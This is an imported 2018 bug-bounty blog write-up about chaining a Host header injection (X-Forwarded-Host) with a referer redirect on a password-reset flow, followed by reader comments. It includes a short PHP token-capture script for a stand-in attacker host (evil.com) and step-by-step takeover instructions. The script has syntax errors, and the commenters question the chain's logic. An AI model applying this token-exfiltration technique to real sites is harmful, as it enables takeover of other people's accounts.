---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-11-30_love-story-of-a-account-takeover-chaining-host-header-injection-to-takeover-some.md
original_filename: 2018-11-30_love-story-of-a-account-takeover-chaining-host-header-injection-to-takeover-some.md
title: Love Story Of A Account Takeover (Chaining Host Header Injection To Takeover
  Someones Account)
category: documents
detected_topics:
- password-reset
- command-injection
- otp
- api-security
tags:
- imported
- documents
- password-reset
- command-injection
- otp
- api-security
language: en
raw_sha256: 0fe0721ef26c1893d8d57a629bd6b2eddaa9917be8683bc0de3fc71a6a3db5e9
text_sha256: 3ac2c935e224c6ce83b63cea23c8568c388d3e4465a807ba67d065de3141a4ca
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Love Story Of A Account Takeover (Chaining Host Header Injection To Takeover Someones Account)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-11-30_love-story-of-a-account-takeover-chaining-host-header-injection-to-takeover-some.md
- Source Type: markdown
- Detected Topics: password-reset, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `0fe0721ef26c1893d8d57a629bd6b2eddaa9917be8683bc0de3fc71a6a3db5e9`
- Text SHA256: `3ac2c935e224c6ce83b63cea23c8568c388d3e4465a807ba67d065de3141a4ca`


## Content

---
title: "Love Story Of A Account Takeover (Chaining Host Header Injection To Takeover Someones Account)"
url: "https://chainlover.blogspot.com/2018/11/love-story-of-account-takeover-chaining.html"
final_url: "https://chainlover.blogspot.com/2018/11/love-story-of-account-takeover-chaining.html"
authors: ["Logical Bimboo"]
bugs: ["Host header injection"]
publication_date: "2018-11-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5553
---

###  Love Story Of A Account Takeover (Chaining Host Header Injection To Takeover Someones Account) 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ November 30, 2018  ](https://chainlover.blogspot.com/2018/11/love-story-of-account-takeover-chaining.html "permanent link")

First Write-up.  
So Recently i was discovered a Host Header Injection [Ex: **radiact.com**].  
Basically when i was testing for “**Password Reset Function** ”.

I notice that we can Redirect by changing the name or adding a extra header “X-Forwarded-Host”. So changing this host to **evil.com** will redirect you to **evil.com**. But as we know reporting simple Host Header Injection with a redirection is not enough to make it more impact.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheOSP-60tINxhUrPHXYoAeab109luUnn_yMqt0mGYq_DiM4VXTv1YVg6SPbvz2frr_BwOCSVmQ1Uxul32iVLnzyZb5Tkn8VX-s2FUqlFJyIXQxbWXoFvl5jR9vz-Wa7Uhq4zhAFgMMlIfd/s400/giphy.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheOSP-60tINxhUrPHXYoAeab109luUnn_yMqt0mGYq_DiM4VXTv1YVg6SPbvz2frr_BwOCSVmQ1Uxul32iVLnzyZb5Tkn8VX-s2FUqlFJyIXQxbWXoFvl5jR9vz-Wa7Uhq4zhAFgMMlIfd/s1600/giphy.gif)

  
So i simply kept this aside and looking for more interesting behavior. I requested a reset token and tried to redirect and capture the referer but no luck. Well looking forward and i was noticed by a parameter called “redirect_to_referer=yes”. I dig into it and i understand that if we login with that parameter it will redirect us to the referer.  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4qu8lUd-UOdehzBctCuTrXOTQ6CIO2PiJZFJYsdlJ9PHoTvZrUX0bGTZTvMgV38NyMbArITDbeDemYdxlgqQbiZ25wYSdREDaoN9u7vJqqwkhGhLwxkEY1UbKEpDw61beG8I9xdjoDRgi/s400/giphy+%25282%2529.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4qu8lUd-UOdehzBctCuTrXOTQ6CIO2PiJZFJYsdlJ9PHoTvZrUX0bGTZTvMgV38NyMbArITDbeDemYdxlgqQbiZ25wYSdREDaoN9u7vJqqwkhGhLwxkEY1UbKEpDw61beG8I9xdjoDRgi/s1600/giphy+%25282%2529.gif)

  
Well i visited our reset token which i generated before Let’s take it as “EX: radiact.com/reset?token=abc” and then i go back to the login panel and Sign In with my credentials and captured that request. After that i added “X-Forwarded-Host: evil.com” and Bingo!!! finally it was redirected to “evil.com/reset?token=abc”.  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDlXxfEC_HjtcTsvfrMSzUDLveLRySqT8vBEmIC1p31KHjkwbys2Mg45ZB-feALdn8RzKvk731EqNrl1XX-IBKpze0iFUJCONaqGrwmPFZ2w5RHkFf1KCrggUopUJ7NwU6NWCXtJCUI0Sc/s400/tenor.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDlXxfEC_HjtcTsvfrMSzUDLveLRySqT8vBEmIC1p31KHjkwbys2Mg45ZB-feALdn8RzKvk731EqNrl1XX-IBKpze0iFUJCONaqGrwmPFZ2w5RHkFf1KCrggUopUJ7NwU6NWCXtJCUI0Sc/s1600/tenor.gif)

Now i generated a php script hosted on my “evil.com/reset/index.php”

> EX:  
> 
>
>> <?php  
>  $x=$_GET[‘token’]  
>  $file = fopen(“token.txt”,”w”);  
>  echo fwrite($file,$x);  
>  fclose($file);  
>  ?>

Now we simply created another trick to execute that attack more simply and more anonymously. We used a firefox extension to add a custom header only for “radiact.com/login”. So We added “X-Forwarded-Host: evil.com”. And then finally we can execute that attack. Let’s Start From The Beginning.

  

01. We Generated a reset token.  
02. And then we visit that reset page.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQusGO3Tch1Vx7ohwLTv1hcZ_lLGUEHLIWSKIEFV82pcnr3trBlxht5F8kZpOcM_HQ7XnWv7JJq8HVsBjTRhjwpejdDPh4zJrC_zi6jSY2X4uL1eApSXUBteNllW97Nd3w6YEc01AdNtOm/s640/3.JPG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQusGO3Tch1Vx7ohwLTv1hcZ_lLGUEHLIWSKIEFV82pcnr3trBlxht5F8kZpOcM_HQ7XnWv7JJq8HVsBjTRhjwpejdDPh4zJrC_zi6jSY2X4uL1eApSXUBteNllW97Nd3w6YEc01AdNtOm/s1600/3.JPG)

  

03. Then we clicked on Sign In.  
04. Then we put our credentials and hit submit.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGlh5T5Np3zCjr-rPr_DiOF1iPO9rGYWJK14fK1m9CBDYQj_r8qu98sMR9qY5wc4X2-TzKsWOP0Rq-LjCeI5GnibcORK91c2rv9cF6Pyead5zPReqPt68a8lhjMibVRKwRWL9fMBJ-jOSz/s640/4.JPG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGlh5T5Np3zCjr-rPr_DiOF1iPO9rGYWJK14fK1m9CBDYQj_r8qu98sMR9qY5wc4X2-TzKsWOP0Rq-LjCeI5GnibcORK91c2rv9cF6Pyead5zPReqPt68a8lhjMibVRKwRWL9fMBJ-jOSz/s1600/4.JPG)

  

05. Bingo We redirected to evil.com/reset?token=abc  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMvq_fQ8grFUzSuNFn7ZKzXk87dKj3_3vUGF17IjRdtTYULT7sRxh5qdjeWW5eXhI2plFhOKHbmkNQx5Yb9liwj8iAUZsa81oBFlg14THh1twqt6YoK9R_S6WRMQtnrwBErWFOAlMj_jC4/s640/5.JPG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMvq_fQ8grFUzSuNFn7ZKzXk87dKj3_3vUGF17IjRdtTYULT7sRxh5qdjeWW5eXhI2plFhOKHbmkNQx5Yb9liwj8iAUZsa81oBFlg14THh1twqt6YoK9R_S6WRMQtnrwBErWFOAlMj_jC4/s1600/5.JPG)

  

  

NOTE: No need to intercept the request because we added a custom header via Firefox Extension So it will automatically execute.

  

06. Visit evil.com/token.txt  
07. Welcome now you can pwned the account by resetting the password.

  

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3pS0KSJ9sjXxt3rk9rgGvzrekyiq1q83ZUj7CUZzhG4I_nfOKtDH8Dy9aJHNOsE8ndPo1X8VhYFJqFWDLxDk6PJkpYdSGc9P3ELMUjfRMVOytNou8TeW6pmBtyPn1ZJopWyw-K1YTSqHx/s400/giphy+%25281%2529.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3pS0KSJ9sjXxt3rk9rgGvzrekyiq1q83ZUj7CUZzhG4I_nfOKtDH8Dy9aJHNOsE8ndPo1X8VhYFJqFWDLxDk6PJkpYdSGc9P3ELMUjfRMVOytNou8TeW6pmBtyPn1ZJopWyw-K1YTSqHx/s1600/giphy+%25281%2529.gif)

  

  

Hope you understand what i tried to explain. Sorry for my bad English experience.  
Thanks For Reading This.  
Take Care.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi70wOvxurMU2CmqEd8H627ThVJwNpvjlSbZZevAmLbfSzmnqmyMg3HD9nj_qpUHv8RBwpI4QoLdJM9T19pnI2ozQpDHyUWMnMubYzkrYf_oDA6U6NGOXI0RyWxhZ1Zpp23KigiCwbCeNPG/s400/tenor+%25281%2529.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi70wOvxurMU2CmqEd8H627ThVJwNpvjlSbZZevAmLbfSzmnqmyMg3HD9nj_qpUHv8RBwpI4QoLdJM9T19pnI2ozQpDHyUWMnMubYzkrYf_oDA6U6NGOXI0RyWxhZ1Zpp23KigiCwbCeNPG/s1600/tenor+%25281%2529.gif)

  

  
  
  
  
  
  

  
  
  
  
  
  

  
  
  
  
  
  

  
  
  
  
  
  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[HulkDon](https://www.blogger.com/profile/00606805324558178715)[February 13, 2019 at 8:21 PM](https://chainlover.blogspot.com/2018/11/love-story-of-account-takeover-chaining.html?showComment=1550118078658#c1879332659483917082)

sry, I cant get it.

Reply[Delete](https://www.blogger.com/comment/delete/7617755420528742471/1879332659483917082)

Replies

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/00368996305449249121)[April 17, 2020 at 10:57 AM](https://chainlover.blogspot.com/2018/11/love-story-of-account-takeover-chaining.html?showComment=1587146255718#c9202299889803720969)

But how will you get someone else token value ?  

Reply[Delete](https://www.blogger.com/comment/delete/7617755420528742471/9202299889803720969)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/7617755420528742471?po=5293602807098314638&hl=en&saa=85391&origin=https://chainlover.blogspot.com&skin=contempo)
